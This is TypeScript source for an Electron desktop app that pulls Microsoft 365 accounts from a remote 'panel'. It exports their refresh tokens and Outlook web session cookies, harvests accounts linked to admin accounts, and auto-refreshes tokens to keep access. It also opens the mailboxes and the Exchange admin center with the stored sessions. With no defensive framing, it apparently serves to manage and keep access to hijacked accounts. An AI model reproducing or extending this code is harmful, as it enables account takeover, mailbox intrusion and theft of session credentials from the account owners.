import {
  authenticatePanel,
  fetchAccounts,
  exportToken,
  exportTokensBatch,
  exportMailboxCookies,
  getPanel,
  encryptPassword,
} from './panelService';
import { addAccount, addAccountWithDedupe, getAccounts, updateAccount } from './accountService';
import { getSettings } from './settingsService';
import { refreshAccountTokenDirect } from './microsoftTokenService';
import { UIAccount } from '../../types/store';

// ----------------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------------
async function encryptCookies(cookies: string): Promise<string> {
  // Use safeStorage encrypt (same as password encryption)
  return window.electron.safeStorage.encrypt(cookies);
}

// decryptCookies omitted for now; will be used when cookie import is implemented

// ----------------------------------------------------------------------
// Panel Sync
// ----------------------------------------------------------------------
export async function syncPanelAccounts(panelId: string): Promise<UIAccount[]> {
  const panel = await authenticatePanel(panelId);
  const remoteAccounts = await fetchAccounts(panel);
  
  // Panelâ€‘specific tag (unique per panel)
  const panelTag = `panel-${panel.id}`;
  const settings = await getSettings();
  const autoRefreshTagId = settings.refresh.tagId || 'autorefresh';
  
  const existing = await getAccounts();
  const added: UIAccount[] = [];
  
  // Collect emails for batch export
  const emails = remoteAccounts.map(r => r.email);
  let tokenMap: Record<string, any> = {};
  try {
    const exported = await exportTokensBatch(panel, emails);
    if (exported.success && Array.isArray(exported.tokens)) {
      for (const token of exported.tokens) {
        tokenMap[token.email] = token;
      }
    } else {
      console.warn('Batch token export failed, falling back to individual export');
      // Fallback to individual export (optional)
    }
  } catch (err) {
    console.error('Batch token export error:', err);
    // Fallback to individual export
  }

  for (const remote of remoteAccounts) {
    const token = tokenMap[remote.email];
    if (!token) {
      console.warn(`No token exported for ${remote.email}, skipping`);
      continue;
    }
    remote.clientId = token.client_id;
    remote.authorityEndpoint = token.authority_endpoint;
    remote.refreshToken = token.refresh_token;
    const scopeStr = typeof token.scope === 'string' ? token.scope : '';
    const defaultExchange = '00000002-0000-0ff1-ce00-000000000000';
    (remote as any).resource =
      token.resource ||
      (scopeStr.includes('https://outlook.office.com') ? 'https://outlook.office.com' : defaultExchange);
    (remote as any).scopeType = token.scope_type || 'ews';

    // Detect admin (will later call Graph API)
    const isAdmin = remote.role === 'admin' || remote.email?.toLowerCase().includes('admin');
    
    // Find existing account by email (ignore panelId) to avoid duplicates
    const existingAccount = existing.find(a => a.email === remote.email);
    let tags: string[];
    if (existingAccount) {
        // Keep existing tags, remove any old panel tag, add new panel tag
        tags = existingAccount.tags.filter(t => !t.startsWith('panel-') && t !== 'detached');
        tags.push(panelTag);
        if (isAdmin && !tags.includes('admin')) tags.push('admin');
        if (autoRefreshTagId && !tags.includes(autoRefreshTagId)) tags.push(autoRefreshTagId);
    } else {
        tags = [panelTag];
        if (isAdmin) tags.push('admin');
        if (autoRefreshTagId) tags.push(autoRefreshTagId);
    }
    
    // Prepare auth object
    let auth: UIAccount['auth'];
    if (remote.clientId && remote.authorityEndpoint && remote.refreshToken) {
      auth = {
        type: 'token',
        clientId: remote.clientId,
        authorityEndpoint: remote.authorityEndpoint,
        refreshToken: remote.refreshToken,
        resource: (remote as any).resource,
        scopeType: (remote as any).scopeType,
      };
      if (existingAccount?.auth?.type === 'token') {
        const prev = existingAccount.auth;
        if (prev.owaCookiesEncrypted) {
          (auth as Extract<UIAccount['auth'], { type: 'token' }>).owaCookiesEncrypted = prev.owaCookiesEncrypted;
        }
        if (prev.owaMailboxMode) {
          (auth as Extract<UIAccount['auth'], { type: 'token' }>).owaMailboxMode = prev.owaMailboxMode;
        }
      }
    } else {
      // Should not happen if export succeeded, but guard
      auth = {
        type: 'token',
        clientId: '',
        authorityEndpoint: '',
        refreshToken: '',
        resource: '00000002-0000-0ff1-ce00-000000000000',
        scopeType: 'ews',
      };
    }
    
    const accountData: Omit<UIAccount, 'id'> = {
      email: remote.email,
      name: remote.name || remote.email.split('@')[0],
      panelId,
      added: existingAccount?.added || new Date().toISOString(),
      status: remote.status === 'active' ? 'active' : 'expired',
      tags,
      auth,
      lastRefresh: remote.lastRefresh || existingAccount?.lastRefresh,
      notes: remote.notes,
    };
    
    if (existingAccount) {
      const updated = await updateAccount(existingAccount.id, accountData);
      added.push(updated);
    } else {
      const newAccount = await addAccount(accountData);
      added.push(newAccount);
    }
  }
  
  return added;
}

// ----------------------------------------------------------------------
// Cookie Import
// ----------------------------------------------------------------------
export async function importAccountViaCookie(url: string, email: string): Promise<UIAccount> {
  const result = await window.electron.actions.captureCookies(url);
  if (!result.success) {
    throw new Error(`Cookie capture failed: ${result.message}`);
  }
  
  if (!result.cookies) {
    throw new Error('No cookies captured');
  }
  const cookiesEncrypted = await encryptCookies(result.cookies);
  const settings = await getSettings();
  const autoRefreshTagId = settings.refresh.tagId || 'autorefresh';
  
  const tags = ['cookie-import'];
  if (autoRefreshTagId) tags.push(autoRefreshTagId);
  
  const accountData: Omit<UIAccount, 'id'> = {
    email,
    added: new Date().toISOString(),
    status: 'active',
    tags,
    auth: {
      type: 'cookie',
      cookies: cookiesEncrypted,
    },
  };
  
  return addAccountWithDedupe(accountData);
}

// ----------------------------------------------------------------------
// Credential Login
// ----------------------------------------------------------------------
export async function addAccountViaCredentials(
  panelId: string,
  email: string,
  password: string
): Promise<UIAccount> {
  // @ts-ignore
  const _panel = await authenticatePanel(panelId);
  // TODO: call panel API to login as this user and obtain token
  // For now, simulate token acquisition (use panel token as placeholder)
  const passwordEncrypted = await encryptPassword(password);
  
  const settings = await getSettings();
  const autoRefreshTagId = settings.refresh.tagId || 'autorefresh';
  
  const tags = ['credential'];
  if (autoRefreshTagId) tags.push(autoRefreshTagId);
  
  const accountData: Omit<UIAccount, 'id'> = {
    email,
    panelId,
    added: new Date().toISOString(),
    status: 'active',
    tags,
    auth: {
      type: 'credential',
      username: email,
      passwordEncrypted,
    },
  };
  
  return addAccountWithDedupe(accountData);
}

// ----------------------------------------------------------------------
// Admin Harvest
// ----------------------------------------------------------------------
export async function harvestAssociatedAccounts(adminAccountId: string): Promise<UIAccount[]> {
  const associated = await window.electron.actions.adminHarvest(adminAccountId);
  const settings = await getSettings();
  const autoRefreshTagId = settings.refresh.tagId || 'autorefresh';
  
  const added: UIAccount[] = [];
  for (const acc of associated) {
    const tags = ['admin-harvest'];
    if (autoRefreshTagId) tags.push(autoRefreshTagId);
    
    const accountData: Omit<UIAccount, 'id'> = {
      email: acc.email,
      panelId: acc.panelId,
      added: new Date().toISOString(),
      status: acc.status || 'active',
      tags,
      auth: acc.auth, // assume already encrypted
    };
    const newAccount = await addAccountWithDedupe(accountData);
    added.push(newAccount);
  }
  return added;
}

// ----------------------------------------------------------------------
// Token Refresh
// ----------------------------------------------------------------------
export async function refreshAccountToken(accountId: string): Promise<UIAccount> {
  const accounts = await getAccounts();
  const account = accounts.find(a => a.id === accountId);
  if (!account) throw new Error('Account not found');
  
  if (account.auth?.type !== 'token') {
    throw new Error('Account does not have token-based auth');
  }
  
  let updates: Partial<UIAccount> = {};
  
  // Try direct Microsoft OAuth refresh first (works even without panel)
  try {
    updates = await refreshAccountTokenDirect(account);
    console.log(`Direct token refresh successful for ${account.email}`);
  } catch (error: any) {
    // If network error and we have a panel, fall back to panel export
    if (error.code === 'NETWORK_ERROR' && account.panelId) {
      console.warn(`Direct refresh network error for ${account.email}, falling back to panel export`);
      try {
        const panel = await getPanel(account.panelId);
        if (!panel || panel.status !== 'connected' || !panel.token) {
          throw new Error('Panel not available for fallback');
        }
        const tokenData = await exportToken(panel, account.email);
        updates = {
          auth: {
            ...account.auth,
            clientId: tokenData.clientId,
            authorityEndpoint: tokenData.authorityEndpoint,
            refreshToken: tokenData.refreshToken,
          },
          lastRefresh: new Date().toISOString(),
          status: 'active',
        };
      } catch (panelError: any) {
        throw new Error(`Both direct and panel refresh failed: ${panelError.message}`);
      }
    } else if (error.code === 'REFRESH_TOKEN_EXPIRED') {
      // Token expired â€“ mark account expired
      updates = {
        status: 'expired',
        lastRefresh: new Date().toISOString(),
      };
    } else {
      // Other error (invalid client, etc.) â€“ reâ€‘throw
      throw error;
    }
  }
  
  const updated = await updateAccount(accountId, updates);
  return updated;
}

export async function refreshAccountTokenViaCredential(accountId: string): Promise<UIAccount> {
  const accounts = await getAccounts();
  const account = accounts.find(a => a.id === accountId);
  if (!account) throw new Error('Account not found');
  
  if (account.auth?.type !== 'credential') {
    throw new Error('Account does not have credential auth');
  }
  
  // TODO: decrypt password, reâ€‘login to panel, obtain new token
  // For now, just update lastRefresh
  const updated = await updateAccount(accountId, {
    lastRefresh: new Date().toISOString(),
    status: 'active',
  });
  return updated;
}

// ----------------------------------------------------------------------
// Mailbox Viewer
// ----------------------------------------------------------------------
/**
 * Pull Microsoft OWA session cookies from your panel (optional route) and store them encrypted on this token account.
 * Panel must implement: `GET /api/mailbox/{email}/export-cookies` with the usual panel Bearer token.
 */
export async function pullOwaCookiesFromPanel(accountId: string): Promise<UIAccount> {
  const accounts = await getAccounts();
  const account = accounts.find(a => a.id === accountId);
  if (!account) throw new Error('Account not found');
  if (!account.panelId) throw new Error('This account is not linked to a panel. Sync accounts from a panel first.');
  if (account.auth?.type !== 'token') throw new Error('Panel cookie import applies to Microsoft token accounts.');
  const panel = await authenticatePanel(account.panelId);
  const res = await exportMailboxCookies(panel, account.email);
  if (!res.ok) throw new Error(res.error);
  const enc = await encryptCookies(res.cookies);
  return updateAccount(accountId, {
    auth: {
      ...account.auth,
      owaCookiesEncrypted: enc,
    },
  });
}

/** Choose how in-app OWA opens for a token account: OAuth injection vs stored Microsoft cookies. */
export async function setOwaMailboxMode(accountId: string, mode: 'token' | 'cookie'): Promise<UIAccount> {
  const accounts = await getAccounts();
  const account = accounts.find(a => a.id === accountId);
  if (!account?.auth) throw new Error('Account not found');
  if (account.auth.type === 'cookie') {
    if (mode === 'token') throw new Error('This account is cookie-only; OWA always uses cookies.');
    return account;
  }
  if (account.auth.type !== 'token') throw new Error('Only Microsoft token accounts support OWA mode.');
  return updateAccount(accountId, {
    auth: { ...account.auth, owaMailboxMode: mode },
  });
}

/** Opens Microsoft 365 Outlook on the web (OWA) in an Electron window (OAuth + MSAL, or cookie session — see account `owaMailboxMode`). */
export async function openOutlookWeb(
  accountId: string,
  options?: { mode?: 'owa' | 'exchangeAdmin'; authPreference?: 'token' | 'cookie' }
): Promise<void> {
  try {
    await window.electron.actions.openOutlook(accountId, options);
  } catch (error: any) {
    const msg = error?.message || String(error);
    if (
      /invalid[_\s-]?grant|invalid refresh token|refresh token has expired|refresh token is invalid/i.test(msg)
    ) {
      throw new Error(
        `Token refresh failed for this mailbox. Re-authenticate the account in Accounts and retry. Details: ${msg}`
      );
    }
    throw error;
  }
}

/** Opens Microsoft OAuth authorize in the **default browser** (official redirect; complete MFA/CA in browser). */
export async function openOwaExternalBrowserSession(accountId: string): Promise<void> {
  const r = await window.electron.actions.openOwaExternalSignIn(accountId);
  if (!r || (r as { success?: boolean }).success !== true) {
    throw new Error((r as { error?: string })?.error || 'Could not start browser sign-in');
  }
  if ((r as { opened?: boolean }).opened === false) {
    throw new Error('Browser sign-in was already opened a moment ago. Check your existing browser tab.');
  }
}

/** @deprecated Use openOutlookWeb — same behavior (OWA, not the panel admin UI). */
export async function openMailbox(accountId: string): Promise<void> {
  await openOutlookWeb(accountId);
}

/** Opens the account in your connected panel’s embedded mailbox (admin URL + panel bearer token). */
export async function openPanelMailbox(accountId: string): Promise<void> {
  await window.electron.actions.openMailbox(accountId);
}

/** Linked panel’s `/admin` in an embedded window (Bearer token). Use for importing users, connectors, SMTP settings, etc. */
export async function openPanelServerAdmin(accountId: string): Promise<void> {
  await window.electron.actions.openPanelAdmin(accountId);
}

/**
 * Open a URL path on the panel server with the same Bearer session as Panel Admin
 * (for example `admin/connectors`, `admin/smtp`). Paths must be under your panel origin.
 */
export async function openPanelAuthenticatedPath(accountId: string, relativePath: string): Promise<void> {
  await window.electron.actions.openPanelPath(accountId, relativePath);
}

/**
 * For **token (Microsoft) accounts**: opens **Microsoft Exchange admin center** in the **system default browser**
 * (sign in there if prompted). For **panel-linked** accounts, opens the panel `/admin` UI in-app.
 */
export async function openPanelAdminDashboard(accountId: string): Promise<void> {
  const accounts = await getAccounts();
  const account = accounts.find(a => a.id === accountId);
  if (account?.auth?.type === 'token') {
    await window.electron.browser.open('https://admin.exchange.microsoft.com/');
    return;
  }
  await window.electron.actions.openPanelAdmin(accountId);
}
